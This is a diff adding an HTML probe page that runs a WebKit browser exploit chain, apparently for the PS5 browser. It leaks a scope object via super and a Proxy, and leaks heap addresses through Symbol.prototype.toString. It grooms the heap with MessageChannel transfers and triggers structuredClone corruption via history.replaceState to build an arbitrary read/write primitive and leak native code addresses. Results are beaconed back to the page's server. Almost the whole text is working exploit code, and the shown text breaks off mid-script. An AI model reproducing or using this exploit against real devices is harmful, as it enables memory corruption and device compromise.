@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>P1082 - structuredClone Corruption Probe</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0a0a0f;color:#c8c8d0;font:13px/1.5 'Courier New',monospace;padding:12px}
+h2{color:#00ff88;font-size:15px;margin:8px 0}
+.log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;max-height:70vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
+.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<h2>P1082 structuredClone Corruption</h2>
+<div id="log" class="log"></div>
+
+<script>
+var logEl=document.getElementById('log');
+var startTime=Date.now();
+function log(m,c){
+  var d=document.createElement('div');
+  d.className=c||'';
+  d.textContent='['+(((Date.now()-startTime)/1000).toFixed(1))+'s] '+m;
+  logEl.appendChild(d);
+  logEl.scrollTop=logEl.scrollHeight;
+}
+
+function beacon(tag,data){
+  try{
+    var p='P1082-'+tag;
+    if(data)p+=' | '+data;
+    new Image().src='/en/ps5/beacon.gif?t='+encodeURIComponent(p)+'&_='+Date.now();
+  }catch(e){}
+}
+
+function hex(v){return '0x'+v.toString(16).padStart(16,'0')}
+function hex32(v){return '0x'+(v>>>0).toString(16).padStart(8,'0')}
+
+// ============================================================
+// SECTION A: Scope Leak Test
+// The webkit.js exploit leaks a scope object via super.foo + Proxy
+// ============================================================
+function testScopeLeak(){
+  log('=== SECTION A: Scope Object Leak ===','info');
+  beacon('A-START');
+  try{
+    // Create a class that leaks its receiver through super.foo + Proxy
+    function ScopeLeaker(){}
+    ScopeLeaker.prototype={
+      leak:function(){return this.__proto__.__proto__}
+    };
+    // Actually use the real technique from webkit.js
+    var Leaker=(function(){
+      var cls=function(){};
+      cls.prototype={
+        leak:function(){
+          // We need class syntax for super - test if available
+          return null;
+        }
+      };
+      return cls;
+    })();
+
+    // Test with class syntax (ES6)
+    var leaked=null;
+    try{
+      leaked=eval("(function(){\
+        class L{\
+          leak(){return super.foo}\
+        }\
+        L.prototype.__proto__=new Proxy({},{\
+          get:function(t,p,r){return r}\
+        });\
+        var l=L.prototype.leak;\
+        return (function(){return l()})();\
+      })()");
+    }catch(e){
+      log('Class syntax eval: '+e.message,'err');
+      beacon('A-CLASS-FAIL','err='+e.message.substring(0,80));
+    }
+
+    if(leaked!==undefined && leaked!==null){
+      log('Scope object leaked: type='+typeof leaked,'ok');
+      // Test if we can set properties on it
+      try{
+        leaked.testProp=42;
+        var readable=leaked.testProp;
+        log('  Property set/read: '+(readable===42?'OK':'FAIL val='+readable),'ok');
+      }catch(e){
+        log('  Property set failed: '+e.message,'warn');
+      }
+      // Test indexed properties
+      try{
+        for(var i=0;i<10;i++) leaked[i]=1.1*i;
+        log('  Indexed props written: 0-9','ok');
+      }catch(e){
+        log('  Indexed props failed: '+e.message,'warn');
+      }
+      // Test defineProperty with getter
+      try{
+        var getterCalled=false;
+        Object.defineProperty(leaked,'g',{
+          get:function(){getterCalled=true;return Symbol('test')},
+          configurable:true
+        });
+        var sym=leaked.g;
+        log('  defineProperty getter: called='+getterCalled+' type='+typeof sym,'ok');
+      }catch(e){
+        log('  defineProperty failed: '+e.message,'warn');
+      }
+      beacon('A-LEAK','type='+typeof leaked);
+    }else{
+      log('Scope leak returned: '+String(leaked),'err');
+      beacon('A-LEAK','FAIL');
+    }
+  }catch(e){
+    log('Section A error: '+e.message,'err');
+    beacon('A-ERR',e.message.substring(0,80));
+  }
+}
+
+// ============================================================
+// SECTION B: Symbol.toString Address Leak Test
+// webkit.js uses a large butterfly + Symbol.toString to leak addresses
+// ============================================================
+function testSymbolLeak(){
+  log('','');
+  log('=== SECTION B: Symbol.toString Address Leak ===','info');
+  beacon('B-START');
+  try{
+    var symbolToString=Symbol.prototype.toString;
+    log('Symbol.prototype.toString: '+typeof symbolToString,'ok');
+
+    // Create a function and give it a large butterfly with objects
+    var carrier=function carrierFn(){return 7};
+    var obj1={marker:0xAAAA};
+    var obj2={marker:0xBBBB};
+    carrier[0]=obj1;
+    // Fill to force butterfly allocation
+    var fillCount=100000; // Start smaller than 9M to avoid OOM
+    for(var i=1;i<fillCount;i++) carrier[i]=0;
+    carrier[1]=obj2;
+    carrier[2]=obj1;
+    carrier[3]=obj2;
+    log('Carrier butterfly filled: '+fillCount+' slots','ok');
+
+    // Leak scope and wrap as Symbol
+    var scope=null;
+    try{
+      scope=eval("(function(){\
+        class L{leak(){return super.foo}}\
+        L.prototype.__proto__=new Proxy({},{get:function(t,p,r){return r}});\
+        var l=L.prototype.leak;\
+        return (function(){return l()})();\
+      })()");
+    }catch(e){
+      log('Scope leak for Symbol test failed: '+e.message,'err');
+      beacon('B-SCOPE-FAIL');
+      return;
+    }
+
+    if(!scope){
+      log('No scope object for Symbol test','err');
+      beacon('B-SCOPE-NULL');
+      return;
+    }
+
+    // Set the carrier as a getter on the scope
+    Object.defineProperty(scope,'g',{
+      get:carrier,
+      configurable:true
+    });
+
+    // Wrap the scope's getter result as a Symbol object
+    var symObj;
+    try{
+      symObj=Object(scope.g);
+      log('Symbol wrapper created: type='+typeof symObj,'ok');
+    }catch(e){
+      log('Symbol wrapper failed: '+e.message,'err');
+      beacon('B-SYMWRAP-FAIL',e.message.substring(0,60));
+      return;
+    }
+
+    // Call Symbol.prototype.toString on it
+    var str;
+    try{
+      str=symbolToString.call(symObj);
+      log('symbolToString length: '+str.length,'ok');
+    }catch(e){
+      log('symbolToString failed: '+e.message,'err');
+      beacon('B-TOSTRING-FAIL',e.message.substring(0,60));
+      return;
+    }
+
+    // Read potential pointer words from the string
+    // The leak position is at offset 7 (after "Symbol(" prefix)
+    var words=[];
+    for(var i=0;i<32;i++){
+      var cc=str.charCodeAt(7+i);
+      words.push(cc);
+    }
+    log('First 32 words at offset 7:','info');
+    // Display as pairs of uint16 (forming uint32s)
+    var ptrs=[];
+    for(var i=0;i<words.length;i+=4){
+      var lo32=words[i]+(words[i+1]<<16);
+      var hi32=words[i+2]+(words[i+3]<<16);
+      var loHex=hex32(lo32>>>0);
+      var hiHex=hex32(hi32>>>0);
+      log('  ['+i+'] lo='+loHex+' hi='+hiHex,'info');
+      // Check if this looks like a pointer (hi=0, lo > 2^32 threshold)
+      if(hi32===0 && lo32!==0){
+        var ptr48=lo32+(words[i+2])*0x100000000;
+      }
+      ptrs.push({lo:lo32>>>0,hi:hi32>>>0});
+    }
+
+    // Check for pointer-like values (48-bit, non-zero, aligned)
+    var ptrCount=0;
+    for(var i=0;i<ptrs.length;i++){
+      var p=ptrs[i];
+      // Pointers on PS5 should be in userland range (< 2^48, > 2^32)
+      // With uint16 words: hi should be 0 and the 48-bit value > 0x100000000
+      if(p.hi===0){
+        var val48=0;
+        var w0=words[i*4], w1=words[i*4+1], w2=words[i*4+2];
+        val48=w0+w1*0x10000+w2*0x100000000;
+        if(val48>0x100000000 && val48<0x1000000000000){
+          log('  POINTER at ['+i+']: '+hex(val48)+' (aligned='+(val48%8===0)+')','hit');
+          ptrCount++;
+        }
+      }
+    }
+
+    beacon('B-RESULT','len='+str.length+'|ptrs='+ptrCount+'|w0='+hex32(words[0])+'|w1='+hex32(words[1]));
+
+    if(ptrCount>0){
+      log('ADDRESS LEAK WORKS! Found '+ptrCount+' pointer(s)','ok');
+    }else{
+      log('No pointers found in Symbol string (may need larger butterfly)','warn');
+    }
+
+    // Try with larger butterfly if first attempt failed
+    if(ptrCount===0 && fillCount<1000000){
+      log('Retrying with 1M butterfly...','info');
+      var carrier2=function c2(){return 8};
+      carrier2[0]=obj1;
+      for(var i=1;i<1000000;i++) carrier2[i]=0;
+      carrier2[1]=obj2;
+      carrier2[2]=obj1;
+      carrier2[3]=obj2;
+
+      var scope2=eval("(function(){\
+        class L{leak(){return super.foo}}\
+        L.prototype.__proto__=new Proxy({},{get:function(t,p,r){return r}});\
+        var l=L.prototype.leak;\
+        return (function(){return l()})();\
+      })()");
+
+      Object.defineProperty(scope2,'g',{get:carrier2,configurable:true});
+      var sym2=Object(scope2.g);
+      var str2=symbolToString.call(sym2);
+      log('1M butterfly symbolToString length: '+str2.length,'info');
+
+      var words2=[];
+      for(var i=0;i<32;i++) words2.push(str2.charCodeAt(7+i));
+      var p2=0;
+      for(var i=0;i<8;i++){
+        var w0=words2[i*4],w1=words2[i*4+1],w2=words2[i*4+2],w3=words2[i*4+3];
+        if(w3===0){
+          var v=w0+w1*0x10000+w2*0x100000000;
+          if(v>0x100000000 && v<0x1000000000000){
+            log('  1M PTR['+i+']: '+hex(v),'hit');
+            p2++;
+          }
+        }
+      }
+      beacon('B-1M','len='+str2.length+'|ptrs='+p2);
+    }
+
+  }catch(e){
+    log('Section B error: '+e.message,'err');
+    beacon('B-ERR',e.message.substring(0,80));
+  }
+}
+
+// ============================================================
+// SECTION C: structuredClone Corruption Test
+// The core bug: history.replaceState with -64000 at index 0xFFFF
+// ============================================================
+function testStructuredCloneCorruption(){
+  log('','');
+  log('=== SECTION C: structuredClone Corruption ===','info');
+  beacon('C-START');
+  try{
+    // Test basic history.replaceState
+    history.replaceState({test:1},'');
+    var s1=history.state;
+    log('history.replaceState basic: '+(s1&&s1.test===1?'OK':'FAIL'),'ok');
+
+    // Test with array
+    history.replaceState([1,2,3],'');
+    var s2=history.state;
+    log('Array state: len='+(s2?s2.length:'null'),'ok');
+
+    // Test with BigInt in array
+    try{
+      history.replaceState([1n<<40n, 42],'');
+      var s3=history.state;
+      log('BigInt in state: '+(s3?'type[0]='+typeof s3[0]+' val[1]='+s3[1]:'null'),'ok');
+    }catch(e){
+      log('BigInt in state FAILED: '+e.message,'err');
+      beacon('C-BIGINT-FAIL',e.message.substring(0,60));
+    }
+
+    // Test deduplication: same object at two indices
+    var shared={marker:0x51515151};
+    var testArr=new Array(5);
+    testArr[0]='filler';
+    testArr[1]=shared;
+    testArr[2]=shared; // Same reference
+    testArr[3]='end';
+    history.replaceState(testArr,'');
+    var s4=history.state;
+    if(s4){
+      var dedup=(s4[1]===s4[2]);
+      log('Deduplication test: clone[1]===clone[2] = '+dedup,'ok');
+      log('  clone[1].marker='+hex32(s4[1]&&s4[1].marker||0),'info');
+      log('  clone[2].marker='+hex32(s4[2]&&s4[2].marker||0),'info');
+      beacon('C-DEDUP','same='+dedup);
+    }
+
+    // Test large array with -64000 at CONTROL_INDEX
+    log('Building large array (0x10000 entries)...','info');
+    var CONTROL=0xFFFF;
+    var DUPLICATE=2;
+    var ref={marker:0x51515151};
+
+    // Build the filler graph (with BigInt)
+    var fillerSize=0xFFFD;
+    var filler=new Array(fillerSize);
+    var pos=0;
+    var huge=1n<<40n;
+    filler[pos++]=huge; // 1 BigInt for modern WebKit path
+    while(pos<fillerSize) filler[pos++]={};
+
+    var outer=new Array(CONTROL+1);
+    outer[0]=filler;
+    outer[1]=ref;
+    outer[2]=ref; // DUPLICATE_INDEX - same as [1]
+    outer[CONTROL]=-64000; // The corruption trigger
+
+    log('Storing via history.replaceState ('+outer.length+' entries)...','info');
+    var storeStart=Date.now();
+    history.replaceState(outer,'');
+    var storeMs=Date.now()-storeStart;
+    log('replaceState took '+storeMs+'ms','ok');
+    beacon('C-STORE','ms='+storeMs+'|len='+outer.length);
+
+    // Now read it back - this triggers deserialization and potentially corruption
+    log('Reading history.state (triggers deserialization)...','info');
+    var readStart=Date.now();
+    var clone=history.state;
+    var readMs=Date.now()-readStart;
+    log('history.state read took '+readMs+'ms','ok');
+
+    if(!clone){
+      log('Clone is null!','err');
+      beacon('C-CLONE-NULL');
+      return;
+    }
+
+    log('Clone length: '+clone.length+' (expected '+(CONTROL+1)+')','info');
+    beacon('C-CLONE','len='+clone.length+'|readMs='+readMs);
+
+    // Check if deduplication held or was corrupted
+    var c1=clone[1];
+    var c2=clone[DUPLICATE];
+    var same=(c1===c2);
+    log('clone[1]===clone[2]: '+same,'info');
+
+    if(same){
+      log('Deduplication held - no corruption on this attempt','warn');
+      beacon('C-NOCRASH','dedup=true');
+    }else{
+      log('DEDUPLICATION BROKEN! clone[1]!==clone[2]','hit');
+      log('  clone[1] type: '+typeof c1,'info');
+      log('  clone[2] type: '+typeof c2,'info');
+
+      // Inspect clone[2] - if corruption worked, this might be a Uint8Array or strange object
+      if(c2 instanceof Uint8Array){
+        log('  clone[2] IS a Uint8Array! length='+c2.length,'hit');
+        // Read its bytes
+        var sample=[];
+        for(var i=0;i<Math.min(48,c2.length);i++) sample.push(c2[i]);
+        log('  First 48 bytes: '+sample.map(function(b){return hex32(b).slice(-2)}).join(' '),'hit');
+        beacon('C-CORRUPTED','type=Uint8Array|len='+c2.length);
+      }else if(c2 instanceof ArrayBuffer){
+        log('  clone[2] IS an ArrayBuffer! size='+c2.byteLength,'hit');
+        beacon('C-CORRUPTED','type=ArrayBuffer|size='+c2.byteLength);
+      }else if(typeof c2==='object' && c2!==null){
+        var keys=Object.keys(c2);
+        log('  clone[2] is object with keys: '+keys.slice(0,10).join(','),'info');
+        if(c2.marker!==undefined) log('  marker='+hex32(c2.marker),'info');
+        beacon('C-DIFF','type=object|keys='+keys.length);
+      }else{
+        log('  clone[2] = '+String(c2),'info');
+        beacon('C-DIFF','type='+typeof c2+'|val='+String(c2).substring(0,30));
+      }
+    }
+
+    // Check if -64000 survived
+    var controlVal=clone[CONTROL];
+    log('clone[0xFFFF]: '+controlVal+' (type='+typeof controlVal+')','info');
+
+    // Clean up
+    history.replaceState(null,'');
+
+  }catch(e){
+    log('Section C error: '+e.message,'err');
+    beacon('C-ERR',e.message.substring(0,100));
+    try{history.replaceState(null,'');}catch(e2){}
+  }
+}
+
+// ============================================================
+// SECTION D: MessageChannel Transfer Test
+// webkit.js uses postMessage with transfer to create heap holes
+// ============================================================
+function testMessageChannelTransfer(){
+  log('','');
+  log('=== SECTION D: MessageChannel Transfer ===','info');
+  beacon('D-START');
+  try{
+    if(typeof MessageChannel!=='function'){
+      log('MessageChannel not available','err');
+      beacon('D-NOMC');
+      return;
+    }
+    var ch=new MessageChannel();
+    log('MessageChannel created','ok');
+
+    // Test transfer (detach) of ArrayBuffers
+    var ab1=new ArrayBuffer(0x10000);
+    var view1=new Uint8Array(ab1);
+    view1[0]=0x42;
+    log('AB before transfer: byteLength='+ab1.byteLength+' view[0]='+view1[0],'ok');
+
+    ch.port1.postMessage(0,[ab1]);
+    log('After transfer: byteLength='+ab1.byteLength+' (expected 0 = detached)','ok');
+    var detached=(ab1.byteLength===0);
+    log('ArrayBuffer detached: '+detached,'ok');
+
+    // Test multiple transfers (heap hole creation)
+    var holes=[];
+    var holeSizes=[0x80000, 0x80000, 0x70000, 0x81000, 0x81000];
+    for(var i=0;i<holeSizes.length;i++){
+      holes.push(new ArrayBuffer(holeSizes[i]));
+    }
+    log('Created '+holes.length+' hole buffers','ok');
+
+    var ch2=new MessageChannel();
+    ch2.port1.postMessage(0,holes);
+    var allDetached=true;
+    for(var i=0;i<holes.length;i++){
+      if(holes[i].byteLength!==0) allDetached=false;
+    }
+    log('All holes detached: '+allDetached,'ok');
+    beacon('D-RESULT','detach='+detached+'|holes='+allDetached);
+
+    ch.port1.close();ch.port2.close();
+    ch2.port1.close();ch2.port2.close();
+
+  }catch(e){
+    log('Section D error: '+e.message,'err');
+    beacon('D-ERR',e.message.substring(0,80));
+  }
+}
+
+// ============================================================
+// SECTION E: Full webkit.js Exploit Attempt
+// Adapted from pastawithpesto/src/webkit.js
+// ============================================================
+function testFullExploit(){
+  log('','');
+  log('=== SECTION E: Full Exploit Attempt ===','info');
+  beacon('E-START');
+
+  var DUPLICATE_INDEX=2;
+  var CONTROL_INDEX=0xFFFF;
+  var MEMORY_WINDOW_SIZE=0x100;
+  var CANARY_OFFSET=0x20;
+  var CELL_BYTES=0x30;
+
+  var symbolToStringFn=Symbol.prototype.toString;
+  var viewHeaderBuf=new Uint8Array(CELL_BYTES);
+  var identityMagic=new Uint8Array([0x5a,0xa5,0xc3,0x3c,0xde,0xad,0xbe,0xef]);
+  var identityBytes=new Uint8Array(8);
+  var memView=null;
+  var memMirror=null;
+  var fHost=null;
+  var tHolder=null;
+  var outerG=null;
+  var liveCandidate=null;
+
+  function readBytesInto(dest,src,count){for(var i=0;i<count;i++)dest[i]=src[i]}
+  function sameBytesCheck(a,b,n){for(var i=0;i<n;i++){if(a[i]!==b[i])return false}return true}
+
+  function uint32AtB(bytes,off){
+    return (bytes[off]|bytes[off+1]<<8|bytes[off+2]<<16|bytes[off+3]<<24)>>>0;
+  }
+  function low48AtB(bytes,off){
+    var lo=uint32AtB(bytes,off);
+    var hi16=bytes[off+4]+bytes[off+5]*0x100;
+    return lo+hi16*0x100000000;
+  }
+  function allZeroB(bytes,s,e){for(var i=s;i<e;i++){if(bytes[i]!==0)return false}return true}
+  function plausibleAddr(v){return Number.isSafeInteger(v)&&v>4294967296&&v<281474976710656}
+  function plausibleCellV(v){return plausibleAddr(v)&&v%8===0}
+  function canon48(bytes,off){return bytes[off+6]===0&&bytes[off+7]===0}
+
+  function encodedHeader(){
+    var raw=new ArrayBuffer(8);
+    var w=new Uint32Array(raw);
+    var d=new Float64Array(raw);
+    w[0]=0x00004250;
+    w[1]=0x01062800;
+    return d[0];
+  }
+
+  function redirectViewE(cand,addr){
+    var scratchBuf=new ArrayBuffer(8);
+    var sB=new Uint8Array(scratchBuf);
+    var sW=new Uint32Array(scratchBuf);
+    var high=Math.floor(addr/0x100000000);
+    sW[0]=addr-high*0x100000000;
+    sW[1]=high;
+    for(var i=0;i<8;i++) cand[0x10+i]=sB[i];
+  }
+  function restoreViewE(cand){
+    for(var i=0;i<8;i++) cand[0x10+i]=viewHeaderBuf[0x10+i];
+  }
+
+  function isOurView(cand,origVec){
+    if(!plausibleCellV(origVec))return false;
+    redirectViewE(cand,origVec+CANARY_OFFSET);
+    readBytesInto(identityBytes,memView,8);
+    restoreViewE(cand);
+    return sameBytesCheck(identityBytes,identityMagic,8)&&memView[0]===0x3c;
+  }
+
+  // Stage 1: Build objects and store history
+  var memBuf=new ArrayBuffer(MEMORY_WINDOW_SIZE);
+  memView=new Uint8Array(memBuf);
+  memMirror=new Uint8Array(memBuf);
+  memMirror[0]=0x3c;
+
+  var lenMarker={keep:0x51515151};
+  fHost={
+    q0:encodedHeader(),
+    q1:1.1,
+    q2:memView,
+    q3:lenMarker,
+    q4:2.2,
+    q5:3.3
+  };
+  delete fHost.q1;
+  delete fHost.q4;
+  delete fHost.q5;
+
+  var nativeTarget=parseInt;
+  var domAnchor=document.createElement('textarea');
+  tHolder={
+    q0:nativeTarget,
+    q1:domAnchor,
+    q2:{marker:0x4d41524b},
+    q3:{marker:0x4d41524c},
+    q4:{marker:0x484f4c44},
+    q5:{marker:0x47554152}
+  };
+
+  // Write canary into memoryView
+  for(var i=0;i<8;i++) memView[CANARY_OFFSET+i]=identityMagic[i];
+  log('Exploit objects prepared','ok');
+
+  // Build filler graph
+  var fillerSize=0xFFFD;
+  var filler=new Array(fillerSize);
+  var pos=0;
+  var huge=1n<<40n;
+  filler[pos++]=huge; // 1 BigInt for modern WebKit
+  while(pos<fillerSize) filler[pos++]={};
+
+  var refTarget={marker:0x51515151};
+  outerG=new Array(CONTROL_INDEX+1);
+  outerG[0]=filler;
+  outerG[1]=refTarget;
+  outerG[2]=refTarget;
+  outerG[CONTROL_INDEX]=-64000;
+
+  log('Storing history graph ('+outerG.length+' entries)...','info');
+  var t0=Date.now();
+  history.replaceState(outerG,'');
+  log('replaceState: '+(Date.now()-t0)+'ms','ok');
+
+  // Stage 2: Address leak via Symbol.toString
+  log('Attempting address leak...','info');
+  var carrier=function carrierFn(){return 7};
+  carrier[0]=fHost;
+  for(var i=1;i<9000000;i++) carrier[i]=0;
+  carrier[1]=tHolder;
+  carrier[2]=fHost;
+  carrier[3]=tHolder;
+
+  var scope;
+  try{
+    scope=eval("(function(){\
+      class L{leak(){return super.foo}}\
+      L.prototype.__proto__=new Proxy({},{get:function(t,p,r){return r}});\
+      var l=L.prototype.leak;\
+      return (function(){return l()})();\
+    })()");
+  }catch(e){
+    log('Scope leak failed: '+e.message,'err');
+    beacon('E-SCOPE-FAIL',e.message.substring(0,60));
+    return;
+  }
+
+  if(!scope){
+    log('Scope is null/undefined','err');
+    beacon('E-SCOPE-NULL');
+    return;
+  }
+
+  for(var i=0;i<512;i++) scope['p'+i]=i;
+  for(var j=0;j<8;j++) scope[j]=1.1*j;
+  Object.defineProperty(scope,'g',{get:carrier,configurable:true});
+  var symObj=Object(scope.g);
+
+  var capturedStr;
+  try{
+    capturedStr=symbolToStringFn.call(symObj);
+  }catch(e){
+    log('symbolToString failed: '+e.message,'err');
+    beacon('E-SYM-FAIL',e.message.substring(0,60));
+    return;
+  }
+
+  var EXPECTED_LEN=924176;
+  log('Symbol string length: '+capturedStr.length+' (expected ~'+EXPECTED_LEN+')','info');
+  beacon('E-SYMLEN','len='+capturedStr.length);
+
+  // Read pointer words
+  var cWords=new Uint16Array(16);
+  for(var i=0;i<16;i++) cWords[i]=capturedStr.charCodeAt(7+i);
+
+  function ptrFromWords(ws,off){
+    if(ws[off+3]!==0)return NaN;
+    var lo=ws[off]+ws[off+1]*0x10000;
+    return lo+ws[off+2]*0x100000000;
+  }
+
+  var hostAddr=ptrFromWords(cWords,0);
+  var holderAddr=ptrFromWords(cWords,4);
+  var hostAddr2=ptrFromWords(cWords,8);
+  var holderAddr2=ptrFromWords(cWords,12);
+
+  log('Leaked addresses:','info');
+  log('  fakeHost[0]:  '+hex(hostAddr),'info');
+  log('  targetHolder[0]: '+hex(holderAddr),'info');
+  log('  fakeHost[1]:  '+hex(hostAddr2),'info');
+  log('  targetHolder[1]: '+hex(holderAddr2),'info');
+
+  var addrMatch=(hostAddr===hostAddr2 && holderAddr===holderAddr2);
+  var addrValid=(!isNaN(hostAddr)&&!isNaN(holderAddr)&&plausibleCellV(hostAddr)&&plausibleCellV(holderAddr)&&hostAddr!==holderAddr);
+
+  log('Addresses match: '+addrMatch+', valid: '+addrValid,'info');
+  beacon('E-ADDRS','host='+hex(hostAddr)+'|holder='+hex(holderAddr)+'|match='+addrMatch+'|valid='+addrValid);
+
+  if(!addrMatch||!addrValid){
+    log('Address leak failed - addresses not consistent or not valid','err');
+    beacon('E-ADDR-FAIL');
+    history.replaceState(null,'');
+    return;
+  }
+
+  log('ADDRESS LEAK SUCCEEDED!','ok');
+
+  // Stage 3: Heap grooming + clone corruption
+  var fakeAddr=hostAddr+0x10;
+  log('Fake address: '+hex(fakeAddr),'info');
+
+  if(!plausibleCellV(fakeAddr)){
+    log('Fake address not plausible','err');
+    beacon('E-FAKE-FAIL');
+    history.replaceState(null,'');
+    return;
+  }
+
+  log('Grooming heap...','info');
+  var keepAlive=[];
+  var keepIdx=0;
+
+  var ch=new MessageChannel();
+  ch.port1.close();
+  ch.port2.close();
+
+  // Fill heap
+  for(var i=0;i<512;i++) keepAlive[keepIdx++]=new ArrayBuffer(0x10000);
+
+  // Create and transfer large slab
+  var slab=new ArrayBuffer(0x400000);
+  ch.port1.postMessage(0,[slab]);
+  slab=null;
+
+  // Create hole buffers
+  var bh1=new ArrayBuffer(0x81000);
+  var bh2=new ArrayBuffer(0x81000);
+  var sep=new ArrayBuffer(0x10000);
+  var earlyH=new ArrayBuffer(0x70000);
+  var guard=new ArrayBuffer(0x90000);
+  var predecessor=new ArrayBuffer(0x80000);
+  var finalH=new ArrayBuffer(0x80000);
+
+  // Fill predecessor with fakeAddr pointer spray
+  var predWords=new Uint32Array(predecessor);
+  var fakeHi=Math.floor(fakeAddr/0x100000000);
+  var fakeLo=fakeAddr-fakeHi*0x100000000;
+  for(var i=0;i<predWords.length;i+=2){
+    predWords[i]=fakeLo;
+    predWords[i+1]=fakeHi;
+  }
+  log('Predecessor sprayed with fakeAddr','ok');
+
+  keepAlive[keepIdx++]=sep;
+  keepAlive[keepIdx++]=guard;
+  keepAlive[keepIdx++]=predecessor;
+
+  // Transfer holes
+  ch.port1.postMessage(0,[bh1,bh2,earlyH,finalH]);
+  log('Holes created via transfer','ok');
+
+  // Stage 4: Read history.state - triggers corruption
+  log('Reading history.state (corruption trigger)...','info');
+  beacon('E-CLONE-START');
+
+  var clone;
+  try{
+    clone=history.state;
+  }catch(e){
+    log('history.state threw: '+e.message,'err');
+    beacon('E-CLONE-ERR',e.message.substring(0,60));
+    return;
+  }
+
+  if(!clone){
+    log('Clone is null','err');
+    beacon('E-CLONE-NULL');
+    return;
+  }
+
+  log('Clone length: '+clone.length+' (expected 327681)','info');
+
+  if(clone.length!==0x50001){
+    log('Unexpected clone length','warn');
+    beacon('E-CLONE-BADLEN','len='+clone.length);
+  }
+
+  // Check corruption
+  var c1=clone[1];
+  var c2=clone[DUPLICATE_INDEX];
+  var dedup=(c1===c2);
+
+  if(dedup){
+    log('Clone NOT corrupted (dedup held)','warn');
+    beacon('E-NOCRASH','dedup=true');
+    // Clean up and we'll retry
+    clone=null;
+    predWords.fill(0);
+    history.replaceState(null,'');
+    return;
+  }
+
+  log('CLONE CORRUPTED! clone[1]!==clone[2]','hit');
+  beacon('E-CORRUPTED','type2='+typeof c2);
+
+  // Inspect the corrupted view
+  var candidate=c2;
+  clone[DUPLICATE_INDEX]=undefined;
+  clone=null;
+
+  if(candidate instanceof Uint8Array){
+    log('Corrupted slot IS Uint8Array! len='+candidate.length,'hit');
+
+    // Read header
+    readBytesInto(viewHeaderBuf,candidate,CELL_BYTES);
+
+    // Inspect header
+    var structId=uint32AtB(viewHeaderBuf,0);
+    var butterPtr=low48AtB(viewHeaderBuf,0x08);
+    var vectorPtr=low48AtB(viewHeaderBuf,0x10);
+    var length=uint32AtB(viewHeaderBuf,0x18);
+
+    log('View header:','info');
+    log('  structureID: '+hex32(structId),'info');
+    log('  butterfly:   '+hex(butterPtr),'info');
+    log('  vector:      '+hex(vectorPtr),'info');
+    log('  length:      '+length+' (expected '+MEMORY_WINDOW_SIZE+')','info');
+
+    beacon('E-HEADER','sid='+hex32(structId)+'|vec='+hex(vectorPtr)+'|len='+length);
+
+    // Validate
+    var validStruct=(structId>=0x100 && structId<0x08000000);
+    var validButterfly=plausibleAddr(butterPtr);
+    var validVector=plausibleAddr(vectorPtr);
+    var validLength=(length===MEMORY_WINDOW_SIZE);
+    var validZero=allZeroB(viewHeaderBuf,0x20,0x28);
+
+    log('Validation: struct='+validStruct+' butterfly='+validButterfly+' vector='+validVector+' length='+validLength+' zeroPad='+validZero,'info');
+
+    if(validStruct && validVector && validLength){
+      log('VALID VIEW HEADER!','hit');
+
+      // Check if this is our view via canary
+      var isOurs=isOurView(candidate,vectorPtr);
+      log('Identity check (canary at vector+0x20): '+isOurs,'info');
+      beacon('E-IDENTITY','ours='+isOurs+'|vec='+hex(vectorPtr));
+
+      if(isOurs){
+        log('','');
+        log('*** FULL MEMORY WINDOW ESTABLISHED ***','hit');
+        log('*** ARBITRARY READ/WRITE PRIMITIVE READY ***','hit');
+        beacon('E-WIN','vec='+hex(vectorPtr)+'|host='+hex(hostAddr)+'|holder='+hex(holderAddr));
+
+        // Now walk the chain: holder -> function -> executable -> nativeFunction
+        log('Walking object chain...','info');
+
+        // Read targetHolder
+        redirectViewE(candidate,holderAddr);
+        var holderBytes=new Uint8Array(0x40);
+        readBytesInto(holderBytes,memView,0x40);
+        var fnAddr=low48AtB(holderBytes,0x10);
+        log('  targetHolder.function: '+hex(fnAddr),'info');
+
+        if(plausibleCellV(fnAddr)){
+          // Read function object
+          redirectViewE(candidate,fnAddr);
+          var fnBytes=new Uint8Array(0x20);
+          readBytesInto(fnBytes,memView,0x20);
+          var execAddr=low48AtB(fnBytes,0x18);
+          log('  function.executable: '+hex(execAddr),'info');
+
+          if(plausibleCellV(execAddr)){
+            // Read executable
+            redirectViewE(candidate,execAddr);
+            var execBytes=new Uint8Array(0x38);
+            readBytesInto(execBytes,memView,0x38);
+            var nativeFn=low48AtB(execBytes,0x28);
+            var nativeCtor=low48AtB(execBytes,0x30);
+            log('  executable.nativeFunction:    '+hex(nativeFn),'info');
+            log('  executable.nativeConstructor: '+hex(nativeCtor),'info');
+
+            if(plausibleAddr(nativeFn)&&plausibleAddr(nativeCtor)){
+              log('','');
+              log('*** CODE ADDRESSES LEAKED ***','hit');
+              log('*** WebKit base derivable from nativeConstructor ***','hit');
+              beacon('E-CODE','nativeFn='+hex(nativeFn)+'|nativeCtor='+hex(nativeCtor));
+            }
+          }
+        }
+
+        // Restore view
+        restoreViewE(candidate);
+        liveCandidate=candidate;
+      }
+    }else{
+      log('Invalid view header - corruption landed wrong','warn');
+      beacon('E-BADHEADER');
+    }
+  }else{
+    log('Corrupted slot is NOT Uint8Array: type='+typeof candidate,'warn');
+    if(candidate&&typeof candidate==='object'){
+      var k=Object.keys(candidate);
+      log('  keys: '+k.slice(0,10).join(','),'info');
+    }
+    beacon('E-WRONGTYPE','type='+typeof candidate);
+  }
+
+  // Clean up
+  predWords.fill(0);
+  history.replaceState(null,'');
+  log('Done','ok');
+  beacon('E-DONE');
+}
+
+// ============================================================
+// RUN ALL SECTIONS
+// ============================================================
+beacon('BOOT');
+log('P1082 structuredClone Corruption Probe','ok');
+log('UA: '+navigator.userAgent.substring(0,80),'info');
+log('','');
+
+setTimeout(function(){
+  try{testScopeLeak()}catch(e){log('A FATAL: '+e.message,'err');beacon('A-FATAL',e.message.substring(0,60))}
+  setTimeout(function(){
+    try{testSymbolLeak()}catch(e){log('B FATAL: '+e.message,'err');beacon('B-FATAL',e.message.substring(0,60))}
+    setTimeout(function(){
